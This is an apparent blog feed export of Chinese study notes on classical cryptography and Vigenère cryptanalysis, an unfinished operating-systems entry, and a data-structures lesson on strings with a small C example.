inline">\((Known-plaintextAttack)\)</span>：</p><ul><li>密码分析者知道一些明文和相应的密文。（随便给的一些明文和密文）</li></ul><p>✓ 破译者已知：密码算法、一定数量的明文-密文对、截获的待解密的密文</p><p>✓ 可通过更改密钥来抵御该种攻击</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202403070944166.png"alt="已知明文攻击" /><figcaption aria-hidden="true">已知明文攻击</figcaption></figure><p>（3）选择明文攻击 <span class="math inline">\((Chosen-plaintextAttack)\)</span>：</p><ul><li>密码分析者可以选择一些明文，并得到相应的密文。（有加密机）</li></ul><p>✓ 破译者已知：密码算法、选定的明文和对应的密文</p><p>✓ 在密码分析者能够访问到发送方的计算机时可能发生</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202403210844089.png"alt="选择明文攻击" /><figcaption aria-hidden="true">选择明文攻击</figcaption></figure><p>（4）选择密文攻击<span class="math inline">\((Chosen-ciphertextAttack)\)</span>：</p><ul><li>密码分析者可以选择一些密文，并得到相应的明文。（有解密机）</li></ul><p>✓ 破译者已知：密码算法、选定的密文和对应的明文</p><p>✓ 在密码分析者能够访问到接收方计算机时可能发生</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202403210845512.png"alt="选择密文攻击" /><figcaption aria-hidden="true">选择密文攻击</figcaption></figure><p>（5）选择文本攻击<span class="math inline">\((Chosen-textAttack)\)</span>：</p><p>✓破译者已知：密码算法、选定的明文和对应的密文、选定的密文和对应的明文</p><p>✓ 选择明文攻击和选择密文攻击的结合</p><p>总结：</p><ul><li><p>唯密文攻击是最困难的</p></li><li><p>上述攻击的强度是递增的</p></li><li><p>一个密码体制是安全的，通常是指在前三种攻击下的安全性</p></li><li><p>唯密文攻击的强度最弱，攻击强度依此增加。</p></li></ul><blockquote><p>公钥加密中选择明文攻击是自动发生的，因为是公钥加密，密钥是公开的🐕</p></blockquote><p>无条件安全的（不可破译的）：一次一密方案（一次一密乱码本），不可破译的</p><p>计算上安全的：流密码、分组密码、公钥密码，给你无限的资源你是可以破译的，这样我们也是可以接受的</p><p>密码算法只要满足以下两条准则之一就行：</p><p><strong>（1） 破译密文的代价超过被加密信息的价值。</strong></p><p><strong>（2 ) 破译密文所花的时间超过信息的有用期。</strong></p><p>满足以上两个准则的密码算法在实际中是可用的。</p><h2 id="古典密码">古典密码</h2><h3 id="代替密码">代替密码</h3><p>代替密码是指先建立一个替换表，加密时将需要加密的明文依次通过查表，替换为相应的字符。明文字符被逐个替换后，生成无任何意义的字符串，即密文。代替密码的密钥就是其替换表。</p><p>根据密码算法加解密时使用替换表多少的不同，代替密码又可分为单表代替密码和多表代替密码。</p><p>✓单表代替密码：密码算法加解密时使用一个固定的替换表</p><p>✓多表代替密码：密码算法加解密时使用多个替换表</p><h4 id="单表代替密码">单表代替密码</h4><ul><li>移位密码</li></ul><p>明文空间<span class="math inline">\(P\)</span>、密文空间<spanclass="math inline">\(C\)</span>和密钥空间<spanclass="math inline">\(K\)</span>满足<spanclass="math inline">\(P=C=K=\{0,1,2,...,25\}=\mathbb{Z}_{26}\)</span></p><p>即把26个英文字母与整数0，1， 2， ...，25一一对应</p><blockquote><p>注意这里A对应的是0，不是1哦😋</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202403070906215.png"alt="移位密码" /><figcaption aria-hidden="true">移位密码</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202403070907827.png"alt="移位密码" /><figcaption aria-hidden="true">移位密码</figcaption></figure><ul><li>使用密钥的单表代替加密</li></ul><p>选用一个英文短语或者单词串作为密钥，去掉其中重复的字母得到一个无重复字母的字母串，然后将字母表中的其他字母依次写于此字母串之后，就可构造出一个字母代替表</p><p>✓ 对于明文为英文单词或短语的情况时，密钥短语密码最多可能有<spanclass="math inline">\(26!=4×1026\)</span>个不同的替换表。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202403070908131.png"alt="使用密钥的单表代替加密" /><figcaption aria-hidden="true">使用密钥的单表代替加密</figcaption></figure><ul><li>仿射密码 (Affine cipher)</li></ul><p>✓仿射密码是一种线性变换。仿射密码的明文空间和密文空间与移位密码相同，但密钥空间为<spanclass="math inline">\(K{=}\{(k_1,k_2)|k_1,k_2\in\mathbb{Z}_{26}\)</span>,<span class="math inline">\(\gcd(k_1,26){=1}\)</span></p><p>✓ 对任意<span class="math inline">\(p{\in}P,\quad c{\in}C,\quadk{=}(k_1,k_2){\in}K\)</span>，</p><p>定义加密变换为： <spanclass="math inline">\(c=E_k\left(p\right)=k_1p+k_2\left({\mathrm{mod}}26\right)\)</span></p><p>相应解密变换为：<span class="math inline">\(p=D_k\)</span> <spanclass="math inline">\((c)=k_1^{-1}\left(c-k_2\right)({\mathrm{mod}}26)\)</span>。其中，<spanclass="math inline">\(k_1k_1^{-1}=1\pmod{26}\)</span>。</p><p>✓ 要求<span class="math inline">\((k_1,26)=1\)</span> ,否则就会有多个明文字母对应一个密文字母的情况</p><p>✓ 密钥空间大小为<spanclass="math inline">\((k_1,k_2)\)</span>=12×26=312, 因为与26互素的<spanclass="math inline">\(k_{1}\)</span>有12个取值，<spanclass="math inline">\(k_{2}\)</span>有26个取值</p><p><span class="math display">\[\begin{aligned}&amp;\text{设明文消息为China,密钥}k=(k_1,k_2)=(7,3)\text{,用仿射密码对其进行加密,然后再进行解密。}\\&amp;\text{解答：利用扩展的欧几里德算法可计算出}k_1^{-1}=7^{-1}=15\mathrm({mod~}26) \\&amp;\text{加密函数为}E_k(p)=7*p+3\mathrm{~(mod~}26)\text{，对应}\text{的解密函数为}D_k\left(c\right)=15*(c-3)(mod26)=15c-19 ({\mathrm{mod}26)。}\end{aligned}\]</span></p><p>明文消息China对应的数字序列为（2，7，8，13，0），用仿射密码对明文进行<strong>加密</strong>：</p><p><spanclass="math display">\[c=E_k(p)=7\times\begin{bmatrix}2\\7\\8\\13\\0\end{bmatrix}+\begin{bmatrix}3\\3\\3\\3\\3\end{bmatrix}=\begin{bmatrix}17\\52\\59\\94\\3\end{bmatrix}\mathrm{mod}26=\begin{bmatrix}17\\0\\7\\16\\3\end{bmatrix}=\begin{bmatrix}R\\A\\H\\Q\\D\end{bmatrix}\]</span></p><p>密文消息为RAHQD</p><p><strong>解密</strong>：</p><p><spanclass="math display">\[D_k(c)=15\times\begin{bmatrix}17\\0\\7\\16\\3\end{bmatrix}-\begin{bmatrix}19\\19\\19\\19\\19\end{bmatrix}=\begin{bmatrix}236\\-19\\86\\221\\226\end{bmatrix}\mathrm{mod}26=\begin{bmatrix}2\\7\\8\\13\\0\end{bmatrix}=\begin{bmatrix}C\\H\\I\\N\\A\end{bmatrix}\]</span></p><p>单表代替密码特点：</p><p>✓ 密钥量很小，不能抵抗穷尽搜索攻击</p><p>✓ 没有将明文字母出现的概率掩藏起来，很容易受到统计分析的攻击</p><h4 id="多表代换密码">多表代换密码</h4><ul><li>使用从明文字母到密文字母的多个映射来隐藏单字母出现的频率分布</li><li>每个映射是单表代替密码中的一对一映射</li><li>将明文字母划分为长度相同的消息单元，称为明文分组，对明文字母成组地进行代替</li><li>特点：使用两个或两个以上的替换表</li></ul><p> 普莱费尔密码（Playfair Cipher）</p><p> 维吉尼亚密码（Vigenere Cipher）</p><p> 希尔密码（Hill Cipher）</p><p><strong><spanclass="math inline">\(Playfair\)</span>密码</strong></p><p>✓将明文中的双字母作为一个单元对待，并将这些单元转换为密文字母组合</p><p>✓ 基于一个5×5字母矩阵，使用一个关键词（密钥）来构造</p><p>✓构造方法：从左至右，从上至下依次填入关键词的字母（去除重复的字母），然后再以字母表顺序依次填入其他的字母。加密时字母I和J被算作一个字母</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202406130858413.png"alt="Playfair Cipher" /><figcaption aria-hidden="true">Playfair Cipher</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202403140923841.png"alt="Playfair加密方法" /><figcaption aria-hidden="true">Playfair加密方法</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202403140923912.png"alt="Playfair加密举例" /><figcaption aria-hidden="true">Playfair加密举例</figcaption></figure><p>Playfair密码的特点</p><p>✓虽然仅有26个字母，但有26×26＝676种双字母组合。因此识别各种双字母组合要困难得多</p><p>✓各个字母组的频率要比单字母呈现出大得多的范围，使得频率分析困难得多</p><p>✓ 仍然使许多明文语言的结构保存完好，使得密码分析者能够利用</p><p><strong><spanclass="math inline">\(Vigenere\)</span>密码</strong></p><p>✓ 最著名的多表代替密码的例子</p><p>✓使用一个词组作为密钥，密钥中每一个字母用来确定一个代替表，每一个密钥字母用来加密一个明文字母，等所有密钥字母使用完后，密钥又再循环使用</p><p>✓该密码体制有一个参数<em>n</em>。在加解密时，同样把英文字母映射为0－25的数字再进行运算，并按<em>n</em>个字母一组进行变换。</p><p>设密钥<spanclass="math inline">\(k=(k_1,k_2,...,k_d)\)</span>，明文<spanclass="math inline">\(p=(p_1,p_2,...,p_n)\)</span>，密文<spanclass="math inline">\(c=(c_1,c_2,\cdotp\cdotp\cdotp,c_n)\)</span></p><p>加密变换：<spanclass="math inline">\(E_k(p)=(c_1,c_2,\cdotp\cdotp\cdotp,c_n)\)</span>，其中<spanclass="math inline">\(c_i=(p_i+k_i)({\mathrm{mod}}26),i=1,2,……n\)</span></p><p>解密变换：<spanclass="math inline">\(D_k(c)=(p_1,p_2,...,p_n)\)</span>，其中<spanclass="math inline">\(p_i=(c_i-k_i)({\mathrm{mod}}26),\:i=1,2\cdots,n\)</span></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202403140937579.png"alt="$Vigenere密码举例" /><figcaption aria-hidden="true">$Vigenere密码举例</figcaption></figure><p><strong><span class="math inline">\(Hill\)</span>密码</strong></p><h3 id="单表代替密码攻击">单表代替密码攻击</h3><h3 id="多表代替密码的破解">多表代替密码的破解</h3><p>多表代替密码从一定程度上隐藏了明文消息的一些统计特征，破译相对较为困难</p><p>在多表代替密码的分析中，首先要确定密钥的长度，也就是要确定所使用的加密表的个数，然后再分析确定具体密钥</p><p>确定密钥长度的常用方法两种，即Kasiski测试法（Kasiskitest）和重合指数法（index of coincidence）</p><p><strong>破译思路</strong>：设法找出密钥长度，将多表替换→单表替换，再破译单表替换密码。</p><h4 id="kasiski测试法">Kasiski测试法</h4><p>➢ 原理</p><p>若用给定的<em>n</em>个密钥表周期性地对明文字母加密，则当明文中有两个相同字母组在明文序列中间隔的字母数为<em>n</em>的倍数时，这两个明文字母组对应的密文字母组必相同。但反过来，若密文中出现两个相同的字母组，它们所对应的明文字母组未必相同，但相同的可能性很大</p><p>➢ Kasiski的测试过程</p><p>搜索长度至少为2的相同密文段，记录这些相同密文段到起始点之间的距离；假设得到如下几个距离X1,X2，…，那么密钥长度<em>n</em>可能就是这些距离的最大公因子</p><p>Kasiski测试法举例</p><p>明文：requ<strong>est</strong>s additional t<strong>est</strong></p><p>密钥：TELEXTEL EXTELEXTEL EXTE</p><p>密文：CAVK<strong>TBL</strong>T EUQWSWJGEA L<strong>TBL</strong></p><p>密文包含字母序列TBL两次，间隔距离为15。密钥的实际长度为5，因此相同字母组的距离反映了密钥长度<em>n</em>的相关信息。</p><p>若公因子不唯一，则采用后续的重合指数法确定密码长度</p><h4 id="重合指数法">重合指数法</h4><p>如果考虑来自26个字母表的完全随机文本，则每个字母都以相同的概率1/26出现，假定另一个随机文本放在第一个的下面，在上下位置出现相同字母<spanclass="math inline">\(a\)</span>的概率为 (1/26)^2,在两个随机文本的上下位置找到任意两个相同字母总的概率为 <spanclass="math inline">\(26*(1/26)^{2}=1/26=0.0385\)</span> 。</p><p>但实际上，由于英文字母出现的概率是不同的，设字母<spanclass="math inline">\(a,b,c,\ldots z\)</span>出现的概率分别为<spanclass="math inline">\(p_0,p_1,p_2,...,p_{25}\)</span>,这样找到两个相同字母的概率为<spanclass="math inline">\(\sum_{i=0}^{25}p_i^2=0.065\)</span></p><p>定义：</p><p>设一个语言由<spanclass="math inline">\(n\)</span>个字母构成，每个字母出现的概率<spanclass="math inline">\(p_i,1\leq i\leqn\)</span>，则重合指数是指其中两个随机元素相同的概率，记为</p><p><span class="math display">\[I_c=\sum_{i=1}^np_i^2\]</span></p><p>这样对于一个完全随机的文本<spanclass="math inline">\(I_C=0.0385\)</span>，与一个有意义的英语文本<spanclass="math inline">\(I_C=0.065\)</span>，差异是比较明显的。</p><p>重合指数的特点：单表代换密码中，密文的重合指数和明文相同。</p><p>重合指数法确定密钥长度</p><p>分析原理</p><ul><li><p>假设密文串为<spanclass="math inline">\(Y=y_1y_2..y_n\)</span>，m是密钥字长度，将Y分割成m个子串</p></li><li><p><spanclass="math inline">\(\mathrm{Y_1=y_1y_{1+m}y_{1+2m\cdots}}\)</span></p></li><li><p><spanclass="math inline">\(\mathrm{Y_2=y_2y_{2+m}y_{2+2m\cdots}}\)</span></p></li><li><p>……</p></li><li><p><spanclass="math inline">\(\mathrm{Y_m=y_{m}y_{2m}y_{3m\cdots}}\)</span></p></li></ul><p>对于每个<span class="math inline">\(Y_i\)</span>,其密文采用的是单表代换方法 (相同的密文对应相同的明文)，其重合指数<spanclass="math inline">\(I_C({Y}_i)\)</span>应接近0.065</p><p>通过尝试不同的m，找到重合指数最接近0.065的那个</p><h4 id="vigenere密码分析举例">Vigenere密码分析举例</h4><p>经Vigenere密码加密后的密文为</p><p>CHREEVOAHMAERATBIAXXWTNXBEEOPHBSBQMQEQERBWRVXUOAKXAOSXXWEAHBWGJMMQMNKGRFVGXWTRZXWIAKLXFPSKAUTEMNDCMGTSXMXBTUIADNGMGPSRELXNJELXVRVPRTULHDNQWTWDTYGBPHXTFALJHASVBFXNGLLCHRZBWELEKMSJIKNBHWRJGNMGJSGLXFEYPHAGNRBIEQJTAMRVLCRREMNDGLXRRIMGNSNRWCHRQHAEYEVTAQEBBIPEEWEVKAKOEWADREMXMTBHHCHRTKDNVRZCHRCLQOHPWQAIIWXNRMGWOIIFKEE</p><p>Kasiski测试法分析</p><p>➢密文串CHR出现在1,166,236,276,286这几个位置，它们之间距离分别是165,70,40,10，这些距离只有一个公因子5，故猜测密钥字长度为5</p><p>重合指数法分析</p><p>➢ 尝试不同的密钥字长度，计算密文的重合指数</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202403211037164.png"alt="重合指数法分析" /><figcaption aria-hidden="true">重合指数法分析</figcaption></figure><p>✓ 分析密钥字</p><p>➢ 确定密钥字长度后，可以使用频率分析方法分别解密Y1 , Y2 , ..., Ym</p><p>➢Y1=CVABWEBQBUAWWQRWWXANTBDPXXRDWBFAXCWMNJJFAIACNRNCATBWKDMCDCQQXWK</p><p>➢Y2=HOEITESEWOOEGMFTIFUDSTNSNVTNDPASNHESBGSEGEMRDRSHEAIEORTHNHOANOE</p><p>➢Y3=RARANOBQRASAJNVRAPTCXUGRJRUQTHLVGRLJHNGYNQRRGINRYQPVEEBRVRHIRIE</p><p>➢Y4=EHAXXPQEVKXHMKGZKSEMMIMEEVLWYXJBLZEIWMLPRJVELMRQEEEKWMHTRCPIMI</p><p>➢Y5=EMTXBHMRXXXBMGXXLKMGXAGLLPHTGTHFLBKKRGXHBTLMXGWHVBEAAXHKZLWWGF</p><p>✓ 分析密钥字方法</p><p>对每一个<span class="math inline">\(\mathrm{Y_i}\)</span>,猜测不同的<span class="math inline">\(k_i\)</span>值，计算： <spanclass="math display">\[M_g=\sum_{i=0}^{25}p_i\frac{f_{i+g}}{n^{\prime}}\]</span></p><ul><li><p>其中<span class="math inline">\(p_0,p_1,..p_{25}\)</span>是字母<span class="math inline">\(\mathrm{a, b, ...,z}\)</span>在英文中出现的概率</p></li><li><p>其中<span class="math inline">\(\mathrm{f_0, f_1,..f_{25}}\)</span>是字母A，B,...,Z在密文中出现的次数</p></li><li><p><span class="math inline">\(n^{\prime}\)</span>是<spanclass="math inline">\(\mathrm{Y_i}\)</span>的长度(即n/m)</p></li></ul><p>当<span class="math inline">\(\mathrm{g= k_i}\)</span>时，<spanclass="math inline">\(\mathrm{p_i} \approx \mathrm{f_{i+ g}/n^{\prime},M_g}\approx 0.065\)</span></p><p>➢ 对每一个<spanclass="math inline">\(\mathrm{Y_i}\)</span>中字母的频率进行统计，记为<spanclass="math inline">\(\mathrm{F_i} , \mathrm{~i= 1, 2, \ldots , k,}\)</span>，<spanclass="math inline">\(F_i\)</span>中包含26个0~1的数值，分别对应每个字母的出现频率</p><p>➢ 用<spanclass="math inline">\(V_{0}\)</span>表示26个英文字母各自的出现频率，即<spanclass="math inline">\(\mathrm{V}_0=[0.082,0.015,\ldots,0.020,0.001]\)</span>, 将<spanclass="math inline">\(\mathrm{V}_{0}\)</span>循环右移j位得到<spanclass="math inline">\(V_{\mathrm{j}}\)</span>， <spanclass="math inline">\(\mathrm{j= }0, 1, \ldots , 25\)</span></p><p>➢ 针对每个<spanclass="math inline">\(\mathrm{F_i}\)</span>，进行点乘计算<spanclass="math inline">\(\mathrm{F_i} \cdot \mathrm{V_j}\)</span></p><p>➢ 找出其中最大数值对应的j值，该值即为第i位密钥中的英文字母</p><p>所获得的密文长度越长，统计分析攻击的破译正确率越高</p><p>✓ 建立Mg分析表</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202403211045452.png"alt="Mg分析表" /><figcaption aria-hidden="true">Mg分析表</figcaption></figure><p>✓ 分析结果</p><p>➢<span class="math inline">\(k_1=9,k_2=0,k_3=13,k_4=4,k_5=19,对应密钥串为K=JANET\)</span></p><p>➢ 明文为</p><p>The almond tree was in tentative blossom. The days were longer, oftenending with magnificent evenings of corrugated pink skies. The huntingseason was over, with hounds and guns put away for six months. Thevineyards were busy again as the well-organized farmers treated theirwines and the more lackadaisical neighbors hurried to do the pruningthey should have done in November.</p><h4 id="重合指数法的应用">重合指数法的应用</h4><p>✓如果密文的重合指数较低，那么就可能是多表替代密码。维吉尼亚密码将密文分行，每行是单表替代密码。</p><p>✓在单表替代时，明文的字母被其它字母代替，但不影响文本的统计属性，即加密后密文的重合指数仍不变，<em>CI</em>（明文）=<em>CI</em>（密文），由此可以判断文本是用单表还是用多表替代加密的。</p><p>✓如果密钥长度（即密文分行的列数）正确，同一行密文有相同字母的概率接近0.065；如果密钥长度不对，则概率将大大小于0.065，显得更随机，由此得到密钥长度（可与Kasiski测试的结果对比）。</p><p>✓重合指数的估算能用于分析两个不同密文，比如接收到两段文本C1，C2，如果它们用同样的方式加密，则<em>CI</em>(C1)≈<em>CI</em>(C2)。</p><blockquote><p>下面是一个公式喵： <span class="math display">\[\begin{align}&amp;1\\&amp;\\&amp;\\&amp;\\&amp;\\&amp;\\\end{align}\]</span></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统 4 文件管理</title>
    <link href="/2023/12/26/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%204%20%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/"/>
    <url>/2023/12/26/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%204%20%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<blockquote><p>8好意思了王道哥哥，我先看老师的婆婆特了，这部分期末考试要求的少，之后再来补上吧🤧🤧</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构 4 串、数组和线性表</title>
    <link href="/2023/12/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%204%20%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E7%BA%BF%E6%80%A7%E8%A1%A8/"/>
    <url>/2023/12/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%204%20%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<blockquote><p>b站王卓老师课程学习</p><p>P67待补充</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312241658909.png"alt="啊啊啊" /><figcaption aria-hidden="true">啊啊啊</figcaption></figure><h1 id="串">4.1 串</h1><p>串(string)：由零个或多个字符组成的有限序列</p><blockquote><p>所谓序列说明串的相邻字符之间具有前驱和后继关系</p></blockquote><p><img src="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312241702248.png" alt="串" style="zoom:50%;" /></p><p><strong>子串</strong>：一个串中任意个连续字符组成的子序列（含空串）称为该串的子串。</p><p>例如，"abcde’的子串有：““、”a“、”ab“、“abcd” 和 “abcde” 等</p><p><strong>真子串</strong>是指不包含自身的所有子串。</p><p><strong>主串</strong>：包含子串的串相应地称为主串</p><p><strong>字符位置</strong>：字符在序列中的序号为该字符在串中的位置、</p><p><strong>子串位置</strong>：子串第一个字符在主串中的位置</p><p><strong>空格串</strong>：由一个或多个空格组成的串，与空串不同，空格串：<code>“ ”</code>，空串：<code>“”</code></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312241708954.png"alt="一个例子" /><figcaption aria-hidden="true">一个例子</figcaption></figure><blockquote><p>a在d中的位置：5</p></blockquote><p>串相等：当且仅当两个串的长度相等并且各个对应位置上的字符都相同时，这两个串才是相等的</p><p>所有空串都是相等的</p><h1 id="案例引入">4.2 案例引入</h1><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312241715463.png"alt="8888" /><figcaption aria-hidden="true">8888</figcaption></figure><p>之后有一个字符串的经典问题，<strong>字符串的匹配</strong></p><h1 id="串的类型定义存储结构算法">4.3 串的类型定义、存储结构、算法</h1><h2 id="串的抽象数据类型的定义">4.3.1 串的抽象数据类型的定义</h2><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312241718815.png"alt="image-20231224171848757" /><figcaption aria-hidden="true">image-20231224171848757</figcaption></figure><h2 id="串的存储结构">4.3.2 串的存储结构</h2><p>串中元素逻辑关系与线性表的相同，串可以采用与线性表相同的<strong>存储结构</strong>。</p><p><img src="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312241813926.png" alt="串的存储结构" style="zoom:50%;" /></p><p>串的逻辑结构与线性表相似，区别仅在于串的数据对象约束为字符集</p><p>串的基本操作和线性表的差别：在线性表的操作中，多以“单个元素”作为操作对象，在串的操作中，多以“串的整体”作为对象</p><h3 id="定长顺序存储结构">1. 定长顺序存储结构</h3><blockquote><p>固定长度的<ahref="http://data.biancheng.net/view/296.html">顺序表</a>来存储字符串。</p><p><strong>这种用的最多</strong></p></blockquote><p>我们知道，顺序表通常使用<ahref="http://data.biancheng.net/view/309.html">数组</a>来实现，数组的创建方式有两种，分别是静态数组和动态数组。以C 语言为例，静态数组指的就是长度固定的数组，动态数组指的是调用 malloc()函数创建的数组，例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 静态数组</span><br><span class="hljs-type">char</span> str[<span class="hljs-number">30</span>] = <span class="hljs-string">&quot;http://data.biancheng.net&quot;</span>；<br><span class="hljs-comment">// 动态数组</span><br><span class="hljs-type">char</span>* str = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">30</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>)); <br></code></pre></td></tr></table></figure><p>对于定义好的静态数组，它的长度是无法修改的；动态数组则不同，它的长度是可变的，定义后还可以调用realloc() 函数扩容。</p><p>串的定长顺序存储既然用固定长度的顺序表来实现，就限定了只能用静态数组实现，不能用动态数组。</p><blockquote><p>🍧🍧🍧其实就是说这里的定长顺序存储结构是静态数组实现，第二种方法堆分配存储结构是动态数组实现</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//定长顺序存储结构</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLEN 255  <span class="hljs-comment">//预定义最大串长为255</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">char</span> ch[MAXLEN+<span class="hljs-number">1</span>];<span class="hljs-comment">//存储串的一维数组，下标为0-255，一般0号位置闲置不用，从1号位置开始</span><br>    <span class="hljs-type">int</span> length; <span class="hljs-comment">//串的当前长度</span><br>&#125;SString;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//Vscode简单实现</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLEN 255</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">char</span> ch[MAXLEN + <span class="hljs-number">1</span>];<br>    <span class="hljs-type">int</span> length;<br>&#125; SString;<br><br><span class="hljs-comment">// 初始化 SString 的函数</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">initSString</span><span class="hljs-params">(SString *s, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *str)</span> &#123;<br>    s-&gt;length = <span class="hljs-built_in">strlen</span>(str);<br>    <span class="hljs-built_in">strncpy</span>(s-&gt;ch + <span class="hljs-number">1</span>, str, MAXLEN);  <span class="hljs-comment">// 假设字符串从1开始索引</span><br>    s-&gt;ch[s-&gt;length + <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;  <span class="hljs-comment">// 在字符串末尾添加空字符</span><br>&#125;<br><br><span class="hljs-comment">// 打印 SString 内容的函数</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">printSString</span><span class="hljs-params">(<span class="hljs-type">const</span> SString *s)</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;字符串：%s\n&quot;</span>, s-&gt;ch + <span class="hljs-number">1</span>);  <span class="hljs-comment">// 从索引1开始打印</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;长度：%d\n&quot;</span>, s-&gt;length);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    SString myString;<br>    <br>    <span class="hljs-comment">// 示例：用字符串初始化 SString</span><br>    initSString(&amp;myString, <span class="hljs-string">&quot;你好，世界！&quot;</span>);<br><br>    <span class="hljs-comment">// 示例：打印 SString 的内容</span><br>    printSString(&amp;myString);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312241844214.png"alt="代码运行结果" /><figcaption aria-hidden="true">代码运行结果</figcaption></figure><blockquote><p>这里解释一下上面的<code>initSString</code>函数：</p><p><code>void initSString(SString *s, const char *str) &#123;&#125;</code></p><ul><li><strong>SString *s</strong>：这是一个指向 <code>SString</code>结构体的指针，表示函数将会修改传递给它的 <code>SString</code>对象。</li><li><strong>const char*str</strong>：这是一个指向常量字符的指针，表示函数将会接受一个 C字符串作为参数，这个 C 字符串是以 <code>'\0'</code> 结尾的。</li></ul><p><code>s-&gt;length = strlen(str);</code>：</p><ul><li><code>strlen(str)</code> 返回输入字符串 <code>str</code>的长度，不包括结尾的空字符 (<code>'\0'</code>)。</li><li><code>s-&gt;length</code> 被赋值为字符串的长度，即存储在<code>SString</code> 结构体中的 <code>length</code> 成员。</li></ul><p><code>strncpy(s-&gt;ch + 1, str, MAXLEN);</code>：</p><ul><li><code>strncpy</code>函数用于复制字符串。它接受三个参数：目标字符串、源字符串和要复制的最大字符数。</li><li><code>s-&gt;ch + 1</code> 是目标字符串的起始位置，表示从数组<code>ch</code> 的索引 1 开始复制，因为这里假设字符串从索引 1开始。</li><li><code>str</code> 是源字符串。</li><li><code>MAXLEN</code> 是要复制的最大字符数。</li><li>这行代码的作用是将源字符串的内容复制到 <code>SString</code> 